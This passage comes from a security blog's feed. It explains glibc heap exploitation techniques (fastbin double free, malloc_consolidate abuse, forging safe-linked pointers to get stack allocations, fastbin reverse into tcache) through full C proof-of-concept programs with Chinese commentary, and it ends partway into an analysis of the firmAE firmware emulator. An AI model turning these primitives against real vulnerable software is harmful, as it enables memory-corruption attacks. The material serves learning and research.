class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后分配三个chunk:a、b、c，先<code>free</code>掉a，再<code>free</code>掉b，fastbin中就会形成b—&gt;a的链表，然后再<code>free</code>掉a,就有a—&gt;b—&gt;a的情况</p><p>这样我们有两种思路，一种就是连续申请三次，就会得到指向相同块的两个指针，还有便是申请一次得到a之后修改指向，实现任意地址申请，如果有edit等函数的话便能实现任意地址写之类的。</p><p>其实以前的tcache bin也能达到这个效果，但是如果认真读代码的话你会发现在free的时候对整个链表进行了检查，如果能通过UAF修改key的话应该能绕过。</p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This is a powerful technique that bypasses the double free check in tcachebin.&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *ptr[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line"><span class="built_in">free</span>(ptr[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">assert(p4 == p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个主要是利用了<code>malloc_consolidate</code>把fastbin与top chunk进行合并的一个过程。首先还是常规的塞满tcache bin</p><p>然后申请一个chunk (p1)，再free掉，这个chunk会被放进fastbin</p><p>然后申请一个0x400大小的chunk，它属于large bin范围，会进入<code>__int_malloc</code>的这个分支，调用<code>malloc_consolidate</code>进行fastbin整理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就把原先处于fastbin的p1合并进了top chunk，然后又在top chunk被分配出来，变成了p3。</p><p>此时我们如果有个double free的利用，free掉 p1，再申请一个0x400大小的p4,就能获取两个指向同一个chunk的指针(p3和p4)，可以进行泄露地址与利用</p><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking calloc into\n&quot;</span></span><br><span class="line">       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">2</span>] __attribute__ ((aligned (<span class="number">0x10</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want calloc() to return is %p.\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>); <span class="comment">//First call to free will add a reference to the fastbin</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Calling free(a) twice renders the program vulnerable to Double Free</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line"><span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *d = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line"><span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line"><span class="string">&quot;so that calloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line"><span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">stack_var[<span class="number">1</span>] = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Notice that the stored value is not a pointer but a poisoned value because of the safe linking mechanism.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;^ Reference: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ptr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) d;</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">*d = (addr &gt;&gt; <span class="number">12</span>) ^ ptr;</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th calloc(1,8): %p\n&quot;</span>, p);</span><br><span class="line">assert((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p == (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var + <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个和刚刚的fastbin_dup差不多，就是提到的两个利用之一：修改链表指向导致任意地址申请，只不过这里比较特殊，是栈地址</p><h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">   <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;An heap address leak is needed to perform this attack.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The same patch also ensures the chunk returned by tcache is properly aligned.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line"><span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">   <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>, victim);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">   <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">   <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">   <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">   <span class="string">&quot;a single free is sufficient.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the fastbin.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line"><span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line"><span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>, &amp;stack_var[<span class="number">2</span>], (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line"><span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line"><span class="comment">// The following operation assumes the address of victim is known, thus requiring</span></span><br><span class="line"><span class="comment">// a heap leak.</span></span><br><span class="line">*(<span class="keyword">size_t</span>**)victim = (<span class="keyword">size_t</span>*)((<span class="keyword">long</span>)&amp;stack_var[<span class="number">0</span>] ^ ((<span class="keyword">long</span>)victim &gt;&gt; <span class="number">12</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Empty tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line"><span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">   <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">   <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">   <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">   <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">   <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">   <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>, q);</span><br><span class="line"></span><br><span class="line">assert(q == (<span class="keyword">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前也断断续续看过一些libc的实现（在之前的fastbin reverse into tcache以及large bin attack文章中总结过一些），但是总感觉不太连贯，没有形成一个体系。并且光干看代码总感觉少点什么。如果看别的大佬的博客的话，最终还是别人的，远远没有</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="heap" scheme="http://phot0n.com/tags/heap/"/>
    
    <category term="IO_FILE" scheme="http://phot0n.com/tags/IO-FILE/"/>
    
    <category term="libc" scheme="http://phot0n.com/tags/libc/"/>
    
  </entry>
  
  <entry>
    <title>firmAE框架分析</title>
    <link href="http://phot0n.com/2023/02/26/firmAE%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"/>
    <id>http://phot0n.com/2023/02/26/firmAE%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/</id>
    <published>2023-02-26T04:51:50.000Z</published>
    <updated>2023-03-31T08:37:07.071Z</updated>
    
    <content type="html"><![CDATA[<p>因为最近主要工作是iot模拟，包括利用firmadyne,firmAE等去模拟一些路由器然后去进行模糊测试之类的。所以最好还是把firmAE整个框架分析一下，这样才能知道大概去往什么方向去改进以及优化。</p><p>firmAE是在firmadyne基础上进行开发的，它主要构成是一些bash脚本，对运行的固件首先进行提取，尝试提取其中的kernel，文件系统等。然后将解包的文件系统挂载起来，往里面放一些firmadyne的东西然后再进行打包处理。之后似乎是进行对网卡的推断与模拟</p><p>我们一步一步来，首先是关键的<code>run.sh</code>，firmAE通过命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh -r [brand] [file]</span><br></pre></td></tr></table></figure><p>来运行固件</p><p>大体上可以分为这么几个模块:提取kernel、提取文件系统、检查架构、制作qemu镜像、配置网卡、运行</p><p>我们首先对run.sh进行分析，如果需要分析相应模块再深入去探索</p><p>首先是引入目录下的<code>./firmae.config</code>文件，这个文件提供了一些路径以及常用函数之类的配置，这里先不对其详细地分析，如果有用到其中的函数再对其进行分析。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -e ./firmae.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ./firmae.config</span><br><span class="line"><span class="keyword">elif</span> [ -e ../firmae.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> 